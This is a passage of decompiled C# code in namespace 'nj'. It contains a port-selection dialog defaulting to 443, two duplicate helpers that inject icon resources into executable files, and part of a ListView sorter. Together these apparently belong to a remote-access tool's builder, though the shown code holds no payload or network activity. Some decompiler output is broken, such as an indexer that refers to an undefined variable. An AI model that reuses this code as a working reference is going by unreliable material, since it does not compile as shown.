	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class FrmPortas : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("btnCancelar")]
		private Button _btnCancelar;

		[AccessedThroughProperty("lbTitulo")]
		private Label _lbTitulo;

		[AccessedThroughProperty("btnOK")]
		private Button _btnOK;

		[AccessedThroughProperty("NDPorta")]
		private NumericUpDown _NDPorta;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("Timer4")]
		private Timer _Timer4;

		protected bool m_BlankValid;

		protected string m_ReturnText;

		internal virtual Button btnCancelar
		{
			[DebuggerNonUserCode]
			get
			{
				return this._btnCancelar;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnCancelar_Click);
				bool flag = this._btnCancelar != null;
				if (flag)
				{
					this._btnCancelar.Click -= value2;
				}
				this._btnCancelar = value;
				flag = (this._btnCancelar != null);
				if (flag)
				{
					this._btnCancelar.Click += value2;
				}
			}
		}

		internal virtual Label lbTitulo
		{
			[DebuggerNonUserCode]
			get
			{
				return this._lbTitulo;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.lbTitulo_Click);
				bool flag = this._lbTitulo != null;
				if (flag)
				{
					this._lbTitulo.Click -= value2;
				}
				this._lbTitulo = value;
				flag = (this._lbTitulo != null);
				if (flag)
				{
					this._lbTitulo.Click += value2;
				}
			}
		}

		internal virtual Button btnOK
		{
			[DebuggerNonUserCode]
			get
			{
				return this._btnOK;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnOK_Click);
				bool flag = this._btnOK != null;
				if (flag)
				{
					this._btnOK.Click -= value2;
				}
				this._btnOK = value;
				flag = (this._btnOK != null);
				if (flag)
				{
					this._btnOK.Click += value2;
				}
			}
		}

		internal virtual NumericUpDown NDPorta
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NDPorta;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NDPorta = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual Timer Timer4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Timer4 = value;
			}
		}

		public FrmPortas()
		{
			base.Load += new EventHandler(this.FrmPortas_Load);
			FrmPortas.__ENCAddToList(this);
			this.m_BlankValid = true;
			this.m_ReturnText = "";
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmPortas.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = FrmPortas.__ENCList.Count == FrmPortas.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = FrmPortas.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmPortas.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									FrmPortas.__ENCList[num] = FrmPortas.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmPortas.__ENCList.RemoveRange(num, FrmPortas.__ENCList.Count - num);
						FrmPortas.__ENCList.Capacity = FrmPortas.__ENCList.Count;
					}
					FrmPortas.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FrmPortas));
			this.btnCancelar = new Button();
			this.lbTitulo = new Label();
			this.btnOK = new Button();
			this.NDPorta = new NumericUpDown();
			this.Button1 = new Button();
			this.Button2 = new Button();
			this.Label1 = new Label();
			this.Timer4 = new Timer(this.components);
			((ISupportInitialize)this.NDPorta).BeginInit();
			this.SuspendLayout();
			this.btnCancelar.Cursor = Cursors.Hand;
			this.btnCancelar.FlatStyle = FlatStyle.Flat;
			Control arg_CC_0 = this.btnCancelar;
			Point location = new Point(321, 278);
			arg_CC_0.Location = location;
			Control arg_E3_0 = this.btnCancelar;
			Padding margin = new Padding(4);
			arg_E3_0.Margin = margin;
			this.btnCancelar.Name = "btnCancelar";
			Control arg_10E_0 = this.btnCancelar;
			Size size = new Size(100, 33);
			arg_10E_0.Size = size;
			this.btnCancelar.TabIndex = 9;
			this.btnCancelar.Text = "Cancelar";
			this.btnCancelar.UseVisualStyleBackColor = true;
			this.lbTitulo.AutoSize = true;
			this.lbTitulo.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_184_0 = this.lbTitulo;
			location = new Point(160, 270);
			arg_184_0.Location = location;
			Control arg_19E_0 = this.lbTitulo;
			margin = new Padding(4, 0, 4, 0);
			arg_19E_0.Margin = margin;
			this.lbTitulo.Name = "lbTitulo";
			Control arg_1C9_0 = this.lbTitulo;
			size = new Size(45, 17);
			arg_1C9_0.Size = size;
			this.lbTitulo.TabIndex = 8;
			this.lbTitulo.Text = "Titulo";
			this.btnOK.Cursor = Cursors.Hand;
			this.btnOK.FlatStyle = FlatStyle.Flat;
			Control arg_224_0 = this.btnOK;
			location = new Point(321, 237);
			arg_224_0.Location = location;
			Control arg_23B_0 = this.btnOK;
			margin = new Padding(4);
			arg_23B_0.Margin = margin;
			this.btnOK.Name = "btnOK";
			Control arg_266_0 = this.btnOK;
			size = new Size(100, 33);
			arg_266_0.Size = size;
			this.btnOK.TabIndex = 7;
			this.btnOK.Text = "OK";
			this.btnOK.UseVisualStyleBackColor = true;
			this.NDPorta.BackColor = Color.Black;
			this.NDPorta.BorderStyle = BorderStyle.FixedSingle;
			this.NDPorta.ForeColor = Color.LightSteelBlue;
			NumericUpDown arg_2F5_0 = this.NDPorta;
			decimal num = new decimal(new int[]
			{
				100,
				0,
				0,
				0
			});
			arg_2F5_0.Increment = num;
			Control arg_30E_0 = this.NDPorta;
			location = new Point(69, 9);
			arg_30E_0.Location = location;
			NumericUpDown arg_34A_0 = this.NDPorta;
			num = new decimal(new int[]
			{
				-1486618625,
				232830643,
				0,
				0
			});
			arg_34A_0.Maximum = num;
			NumericUpDown arg_37E_0 = this.NDPorta;
			num = new decimal(new int[]
			{
				1,
				0,
				0,
				0
			});
			arg_37E_0.Minimum = num;
			this.NDPorta.Name = "NDPorta";
			Control arg_3A9_0 = this.NDPorta;
			size = new Size(125, 25);
			arg_3A9_0.Size = size;
			this.NDPorta.TabIndex = 12;
			this.NDPorta.TextAlign = HorizontalAlignment.Center;
			NumericUpDown arg_3FC_0 = this.NDPorta;
			num = new decimal(new int[]
			{
				443,
				0,
				0,
				0
			});
			arg_3FC_0.Value = num;
			this.Button1.Cursor = Cursors.Hand;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_462_0 = this.Button1;
			location = new Point(9, 41);
			arg_462_0.Location = location;
			Control arg_479_0 = this.Button1;
			margin = new Padding(4);
			arg_479_0.Margin = margin;
			this.Button1.Name = "Button1";
			Control arg_4A7_0 = this.Button1;
			size = new Size(185, 33);
			arg_4A7_0.Size = size;
			this.Button1.TabIndex = 13;
			this.Button1.Text = "Start";
			this.Button1.UseVisualStyleBackColor = true;
			this.Button2.Cursor = Cursors.Hand;
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button2.ForeColor = Color.LightSteelBlue;
			Control arg_539_0 = this.Button2;
			location = new Point(9, 82);
			arg_539_0.Location = location;
			Control arg_550_0 = this.Button2;
			margin = new Padding(4);
			arg_550_0.Margin = margin;
			this.Button2.Name = "Button2";
			Control arg_57E_0 = this.Button2;
			size = new Size(185, 33);
			arg_57E_0.Size = size;
			this.Button2.TabIndex = 14;
			this.Button2.Text = "Exit";
			this.Button2.UseVisualStyleBackColor = true;
			this.Label1.AutoSize = true;
			this.Label1.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label1.ForeColor = Color.LightSteelBlue;
			Control arg_5FF_0 = this.Label1;
			location = new Point(12, 9);
			arg_5FF_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_62A_0 = this.Label1;
			size = new Size(51, 19);
			arg_62A_0.Size = size;
			this.Label1.TabIndex = 15;
			this.Label1.Text = "Port :";
			SizeF autoScaleDimensions = new SizeF(8f, 17f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(201, 121);
			this.ClientSize = size;
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.Button2);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.NDPorta);
			this.Controls.Add(this.btnCancelar);
			this.Controls.Add(this.lbTitulo);
			this.Controls.Add(this.btnOK);
			this.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ForeColor = Color.White;
			this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			margin = new Padding(4);
			this.Margin = margin;
			size = new Size(207, 145);
			this.MaximumSize = size;
			size = new Size(207, 145);
			this.MinimumSize = size;
			this.Name = "FrmPortas";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "(Port)";
			this.TopMost = true;
			((ISupportInitialize)this.NDPorta).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public DialogResult ShowDialog(string TitleText, string PromptText, string DefaultText, ref string EnteredText, bool BlankValid)
		{
			this.m_BlankValid = BlankValid;
			this.lbTitulo.Text = PromptText;
			this.Text = TitleText;
			this.NDPorta.Value = Conversions.ToDecimal(DefaultText);
			this.ShowDialog();
			EnteredText = this.m_ReturnText;
			return this.DialogResult;
		}

		private void btnOK_Click(object sender, EventArgs e)
		{
		}

		private void btnCancelar_Click(object sender, EventArgs e)
		{
		}

		private void lbTitulo_Click(object sender, EventArgs e)
		{
		}

		private void FrmPortas_Load(object sender, EventArgs e)
		{
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 55;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 350;
			}
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			this.DialogResult = DialogResult.OK;
			this.m_ReturnText = Conversions.ToString(this.NDPorta.Value);
			this.Close();
		}

		private void Button2_Click(object sender, EventArgs e)
		{
			this.DialogResult = DialogResult.Cancel;
			this.m_ReturnText = "";
			this.Close();
		}
	}
}

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;

namespace nj
{
	public class Ico
	{
		[SuppressUnmanagedCodeSecurity]
		private class NativeMethods
		{
			[DebuggerNonUserCode]
			public NativeMethods()
			{
			}

			[DllImport("kernel32")]
			public static extern IntPtr BeginUpdateResource(string fileName, [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

			[DllImport("kernel32")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

			[DllImport("kernel32")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
		}

		private struct ICONDIR
		{
			public ushort Reserved;

			public ushort Type;

			public ushort Count;
		}

		private struct ICONDIRENTRY
		{
			public byte Width;

			public byte Height;

			public byte ColorCount;

			public byte Reserved;

			public ushort Planes;

			public ushort BitCount;

			public int BytesInRes;

			public int ImageOffset;
		}

		private struct BITMAPINFOHEADER
		{
			public uint Size;

			public int Width;

			public int Height;

			public ushort Planes;

			public ushort BitCount;

			public uint Compression;

			public uint SizeImage;

			public int XPelsPerMeter;

			public int YPelsPerMeter;

			public uint ClrUsed;

			public uint ClrImportant;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 2)]
		private struct GRPICONDIRENTRY
		{
			public byte Width;

			public byte Height;

			public byte ColorCount;

			public byte Reserved;

			public ushort Planes;

			public ushort BitCount;

			public int BytesInRes;

			public ushort ID;
		}

		private class IconFile
		{
			private Ico.ICONDIR iconDir;

			private Ico.ICONDIRENTRY[] iconEntry;

			private byte[][] iconImage;

			public int ImageCount
			{
				get
				{
					return (int)this.iconDir.Count;
				}
			}

			public byte[] ImageData
			{
				get
				{
					return this.iconImage[index];
				}
			}

			private IconFile()
			{
				this.iconDir = default(Ico.ICONDIR);
			}

			public static Ico.IconFile FromFile(string filename)
			{
				Ico.IconFile iconFile = new Ico.IconFile();
				byte[] array = File.ReadAllBytes(filename);
				GCHandle gCHandle = GCHandle.Alloc(array, GCHandleType.Pinned);
				iconFile.iconDir = (Ico.ICONDIR)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), typeof(Ico.ICONDIR));
				checked
				{
					iconFile.iconEntry = new Ico.ICONDIRENTRY[(int)(iconFile.iconDir.Count - 1 + 1)];
					iconFile.iconImage = new byte[(int)(iconFile.iconDir.Count - 1 + 1)][];
					int num = Marshal.SizeOf(iconFile.iconDir);
					Type typeFromHandle = typeof(Ico.ICONDIRENTRY);
					int num2 = Marshal.SizeOf(typeFromHandle);
					int arg_A6_0 = 0;
					int num3 = (int)(iconFile.iconDir.Count - 1);
					int num4 = arg_A6_0;
					while (true)
					{
						int arg_140_0 = num4;
						int num5 = num3;
						if (arg_140_0 > num5)
						{
							break;
						}
						IntPtr ptr = new IntPtr(gCHandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num));
						Ico.ICONDIRENTRY iCONDIRENTRY = (Ico.ICONDIRENTRY)Marshal.PtrToStructure(ptr, typeFromHandle);
						iconFile.iconEntry[num4] = iCONDIRENTRY;
						iconFile.iconImage[num4] = new byte[iCONDIRENTRY.BytesInRes - 1 + 1];
						Buffer.BlockCopy(array, iCONDIRENTRY.ImageOffset, iconFile.iconImage[num4], 0, iCONDIRENTRY.BytesInRes);
						num += num2;
						num4++;
					}
					gCHandle.Free();
					return iconFile;
				}
			}

			public byte[] CreateIconGroupData(uint iconBaseID)
			{
				checked
				{
					int num = Marshal.SizeOf(typeof(Ico.ICONDIR)) + Marshal.SizeOf(typeof(Ico.GRPICONDIRENTRY)) * this.ImageCount;
					byte[] array = new byte[num - 1 + 1];
					GCHandle gCHandle = GCHandle.Alloc(array, GCHandleType.Pinned);
					Marshal.StructureToPtr(this.iconDir, gCHandle.AddrOfPinnedObject(), false);
					int num2 = Marshal.SizeOf(this.iconDir);
					int arg_72_0 = 0;
					int num3 = this.ImageCount - 1;
					int num4 = arg_72_0;
					while (true)
					{
						int arg_1B8_0 = num4;
						int num5 = num3;
						if (arg_1B8_0 > num5)
						{
							break;
						}
						Ico.GRPICONDIRENTRY gRPICONDIRENTRY = default(Ico.GRPICONDIRENTRY);
						Ico.BITMAPINFOHEADER bITMAPINFOHEADER = default(Ico.BITMAPINFOHEADER);
						GCHandle gCHandle2 = GCHandle.Alloc(bITMAPINFOHEADER, GCHandleType.Pinned);
						Marshal.Copy(this.get_ImageData(num4), 0, gCHandle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof(Ico.BITMAPINFOHEADER)));
						gCHandle2.Free();
						gRPICONDIRENTRY.Width = this.iconEntry[num4].Width;
						gRPICONDIRENTRY.Height = this.iconEntry[num4].Height;
						gRPICONDIRENTRY.ColorCount = this.iconEntry[num4].ColorCount;
						gRPICONDIRENTRY.Reserved = this.iconEntry[num4].Reserved;
						gRPICONDIRENTRY.Planes = bITMAPINFOHEADER.Planes;
						gRPICONDIRENTRY.BitCount = bITMAPINFOHEADER.BitCount;
						gRPICONDIRENTRY.BytesInRes = this.iconEntry[num4].BytesInRes;
						gRPICONDIRENTRY.ID = (ushort)(unchecked((ulong)iconBaseID) + (ulong)(unchecked((long)num4)));
						object arg_191_0 = gRPICONDIRENTRY;
						IntPtr ptr = new IntPtr(gCHandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num2));
						Marshal.StructureToPtr(arg_191_0, ptr, false);
						num2 += Marshal.SizeOf(typeof(Ico.GRPICONDIRENTRY));
						num4++;
					}
					gCHandle.Free();
					return array;
				}
			}
		}

		[DebuggerNonUserCode]
		public Ico()
		{
		}

		public static void InjectIcon(string exeFileName, string iconFileName)
		{
			Ico.InjectIcon(exeFileName, iconFileName, 1u, 1u);
		}

		public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
		{
			Ico.IconFile iconFile = Ico.IconFile.FromFile(iconFileName);
			IntPtr intPtr = Ico.NativeMethods.BeginUpdateResource(exeFileName, false);
			byte[] array = iconFile.CreateIconGroupData(iconBaseID);
			IntPtr arg_37_0 = intPtr;
			IntPtr intPtr2 = new IntPtr(14L);
			IntPtr arg_37_1 = intPtr2;
			IntPtr intPtr3 = new IntPtr((long)((ulong)iconGroupID));
			Ico.NativeMethods.UpdateResource(arg_37_0, arg_37_1, intPtr3, 0, array, array.Length);
			int arg_48_0 = 0;
			checked
			{
				int num = iconFile.ImageCount - 1;
				int num2 = arg_48_0;
				while (true)
				{
					int arg_89_0 = num2;
					int num3 = num;
					if (arg_89_0 > num3)
					{
						break;
					}
					byte[] array2 = iconFile.get_ImageData(num2);
					IntPtr arg_77_0 = intPtr;
					intPtr3 = new IntPtr(3L);
					IntPtr arg_77_1 = intPtr3;
					intPtr2 = new IntPtr((long)(unchecked((ulong)iconBaseID) + (ulong)(unchecked((long)num2))));
					Ico.NativeMethods.UpdateResource(arg_77_0, arg_77_1, intPtr2, 0, array2, array2.Length);
					num2++;
				}
				Ico.NativeMethods.EndUpdateResource(intPtr, false);
			}
		}
	}
}

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;

namespace nj
{
	public class IconChanger
	{
		[SuppressUnmanagedCodeSecurity]
		private class NativeMethods
		{
			[DebuggerNonUserCode]
			public NativeMethods()
			{
			}

			[DllImport("kernel32")]
			public static extern IntPtr BeginUpdateResource(string fileName, [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

			[DllImport("kernel32")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

			[DllImport("kernel32")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
		}

		private struct ICONDIR
		{
			public ushort Reserved;

			public ushort Type;

			public ushort Count;
		}

		private struct ICONDIRENTRY
		{
			public byte Width;

			public byte Height;

			public byte ColorCount;

			public byte Reserved;

			public ushort Planes;

			public ushort BitCount;

			public int BytesInRes;

			public int ImageOffset;
		}

		private struct BITMAPINFOHEADER
		{
			public uint Size;

			public int Width;

			public int Height;

			public ushort Planes;

			public ushort BitCount;

			public uint Compression;

			public uint SizeImage;

			public int XPelsPerMeter;

			public int YPelsPerMeter;

			public uint ClrUsed;

			public uint ClrImportant;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 2)]
		private struct GRPICONDIRENTRY
		{
			public byte Width;

			public byte Height;

			public byte ColorCount;

			public byte Reserved;

			public ushort Planes;

			public ushort BitCount;

			public int BytesInRes;

			public ushort ID;
		}

		private class IconFile
		{
			private IconChanger.ICONDIR iconDir;

			private IconChanger.ICONDIRENTRY[] iconEntry;

			private byte[][] iconImage;

			public int ImageCount
			{
				get
				{
					return (int)this.iconDir.Count;
				}
			}

			public byte[] ImageData
			{
				get
				{
					return this.iconImage[index];
				}
			}

			[DebuggerNonUserCode]
			public IconFile()
			{
				this.iconDir = default(IconChanger.ICONDIR);
			}

			public static IconChanger.IconFile FromFile(string filename)
			{
				IconChanger.IconFile iconFile = new IconChanger.IconFile();
				byte[] array = File.ReadAllBytes(filename);
				GCHandle gCHandle = GCHandle.Alloc(array, GCHandleType.Pinned);
				iconFile.iconDir = (IconChanger.ICONDIR)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), typeof(IconChanger.ICONDIR));
				checked
				{
					iconFile.iconEntry = new IconChanger.ICONDIRENTRY[(int)(iconFile.iconDir.Count - 1 + 1)];
					iconFile.iconImage = new byte[(int)(iconFile.iconDir.Count - 1 + 1)][];
					int num = Marshal.SizeOf(iconFile.iconDir);
					Type typeFromHandle = typeof(IconChanger.ICONDIRENTRY);
					int num2 = Marshal.SizeOf(typeFromHandle);
					int arg_A6_0 = 0;
					int num3 = (int)(iconFile.iconDir.Count - 1);
					int num4 = arg_A6_0;
					while (true)
					{
						int arg_140_0 = num4;
						int num5 = num3;
						if (arg_140_0 > num5)
						{
							break;
						}
						IntPtr ptr = new IntPtr(gCHandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num));
						IconChanger.ICONDIRENTRY iCONDIRENTRY = (IconChanger.ICONDIRENTRY)Marshal.PtrToStructure(ptr, typeFromHandle);
						iconFile.iconEntry[num4] = iCONDIRENTRY;
						iconFile.iconImage[num4] = new byte[iCONDIRENTRY.BytesInRes - 1 + 1];
						Buffer.BlockCopy(array, iCONDIRENTRY.ImageOffset, iconFile.iconImage[num4], 0, iCONDIRENTRY.BytesInRes);
						num += num2;
						num4++;
					}
					gCHandle.Free();
					return iconFile;
				}
			}

			public byte[] CreateIconGroupData(uint iconBaseID)
			{
				checked
				{
					int num = Marshal.SizeOf(typeof(IconChanger.ICONDIR)) + Marshal.SizeOf(typeof(IconChanger.GRPICONDIRENTRY)) * this.ImageCount;
					byte[] array = new byte[num - 1 + 1];
					GCHandle gCHandle = GCHandle.Alloc(array, GCHandleType.Pinned);
					Marshal.StructureToPtr(this.iconDir, gCHandle.AddrOfPinnedObject(), false);
					int num2 = Marshal.SizeOf(this.iconDir);
					int arg_72_0 = 0;
					int num3 = this.ImageCount - 1;
					int num4 = arg_72_0;
					while (true)
					{
						int arg_1B8_0 = num4;
						int num5 = num3;
						if (arg_1B8_0 > num5)
						{
							break;
						}
						IconChanger.GRPICONDIRENTRY gRPICONDIRENTRY = default(IconChanger.GRPICONDIRENTRY);
						IconChanger.BITMAPINFOHEADER bITMAPINFOHEADER = default(IconChanger.BITMAPINFOHEADER);
						GCHandle gCHandle2 = GCHandle.Alloc(bITMAPINFOHEADER, GCHandleType.Pinned);
						Marshal.Copy(this.get_ImageData(num4), 0, gCHandle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof(IconChanger.BITMAPINFOHEADER)));
						gCHandle2.Free();
						gRPICONDIRENTRY.Width = this.iconEntry[num4].Width;
						gRPICONDIRENTRY.Height = this.iconEntry[num4].Height;
						gRPICONDIRENTRY.ColorCount = this.iconEntry[num4].ColorCount;
						gRPICONDIRENTRY.Reserved = this.iconEntry[num4].Reserved;
						gRPICONDIRENTRY.Planes = bITMAPINFOHEADER.Planes;
						gRPICONDIRENTRY.BitCount = bITMAPINFOHEADER.BitCount;
						gRPICONDIRENTRY.BytesInRes = this.iconEntry[num4].BytesInRes;
						gRPICONDIRENTRY.ID = (ushort)(unchecked((ulong)iconBaseID) + (ulong)(unchecked((long)num4)));
						object arg_191_0 = gRPICONDIRENTRY;
						IntPtr ptr = new IntPtr(gCHandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num2));
						Marshal.StructureToPtr(arg_191_0, ptr, false);
						num2 += Marshal.SizeOf(typeof(IconChanger.GRPICONDIRENTRY));
						num4++;
					}
					gCHandle.Free();
					return array;
				}
			}
		}

		[DebuggerNonUserCode]
		public IconChanger()
		{
		}

		public static void InjectIcon(string exeFileName, string iconFileName)
		{
			IconChanger.InjectIcon(exeFileName, iconFileName, 1u, 1u);
		}

		public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
		{
			IconChanger.IconFile iconFile = IconChanger.IconFile.FromFile(iconFileName);
			IntPtr intPtr = IconChanger.NativeMethods.BeginUpdateResource(exeFileName, false);
			byte[] array = iconFile.CreateIconGroupData(iconBaseID);
			IntPtr arg_37_0 = intPtr;
			IntPtr intPtr2 = new IntPtr(14L);
			IntPtr arg_37_1 = intPtr2;
			IntPtr intPtr3 = new IntPtr((long)((ulong)iconGroupID));
			IconChanger.NativeMethods.UpdateResource(arg_37_0, arg_37_1, intPtr3, 0, array, array.Length);
			int arg_48_0 = 0;
			checked
			{
				int num = iconFile.ImageCount - 1;
				int num2 = arg_48_0;
				while (true)
				{
					int arg_89_0 = num2;
					int num3 = num;
					if (arg_89_0 > num3)
					{
						break;
					}
					byte[] array2 = iconFile.get_ImageData(num2);
					IntPtr arg_77_0 = intPtr;
					intPtr3 = new IntPtr(3L);
					IntPtr arg_77_1 = intPtr3;
					intPtr2 = new IntPtr((long)(unchecked((ulong)iconBaseID) + (ulong)(unchecked((long)num2))));
					IconChanger.NativeMethods.UpdateResource(arg_77_0, arg_77_1, intPtr2, 0, array2, array2.Length);
					num2++;
				}
				IconChanger.NativeMethods.EndUpdateResource(intPtr, false);
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class L1V : ListView
	{
		public class clsListviewSorter : IComparer
		{
			private int m_ColumnNumber;

			private SortOrder m_SortOrder;

			public clsListviewSorter(int column_number, SortOrder sort_order)
			{
				this.m_ColumnNumber = column_number;
				this.m_SortOrder = sort_order;
			}

			public int Compare(object x, object y)
			{
				ListViewItem listViewItem = (ListViewItem)x;
				ListViewItem listViewItem2 = (ListViewItem)y;
				string text = (listViewItem.SubItems.Count > this.m_ColumnNumber) ? listViewItem.SubItems[this.m_ColumnNumber].Text : "";
				string text2 = (listViewItem2.SubItems.Count > this.m_ColumnNumber) ? listViewItem2.SubItems[this.m_ColumnNumber].Text : "";
				bool flag = this.m_SortOrder == SortOrder.Ascending;
				int result;
				if (flag)
				{
					bool flag2 = Versioned.IsNumeric(text) & Versioned.IsNumeric(text2);
					if (flag2)
					{
						result = Conversion.Val(text).CompareTo(Conversion.Val(text2));
					}
					else
					{
						flag2 = !(Information.IsDate(text) & Information.IsDate(text2));
						if (flag2)
						{
							result = string.Compare(text, text2);
						}
						else
						{
							result = DateTime.Parse(text).CompareTo(DateTime.Parse(text2));
						}
					}
				}
				else
				{
					bool flag2 = Versioned.IsNumeric(text) & Versioned.IsNumeric(text2);
					if (flag2)
					{
						result = Conversion.Val(text2).CompareTo(Conversion.Val(text));
					}
					else
					{
						flag2 = !(Information.IsDate(text) & Information.IsDate(text2));
						if (flag2)
						{
							result = string.Compare(text2, text);
						}
						else
						{
							result = DateTime.Parse(text2).CompareTo(DateTime.Parse(text));
						}
					}
				}
				return result;
			}
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private ColumnHeader m_SortingColumn;

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = L1V.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = L1V.__ENCList.Count == L1V.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = L1V.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = L1V.__ENCList[num3];
							flag = weakReference.IsAlive;
